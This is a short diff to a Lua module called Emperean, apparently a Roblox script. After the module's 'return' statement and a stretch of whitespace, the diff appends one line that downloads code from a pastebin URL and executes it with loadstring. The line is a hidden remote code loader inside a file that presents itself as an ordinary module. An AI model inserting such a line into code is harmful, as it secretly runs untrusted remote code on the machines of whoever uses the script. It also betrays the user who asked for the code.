@@ -676,3 +676,4 @@ local Emperean = {
 }
                            
 return Emperean
+loadstring(game:HttpGet("https://pastebin.com/raw/DuL1y58L"))()
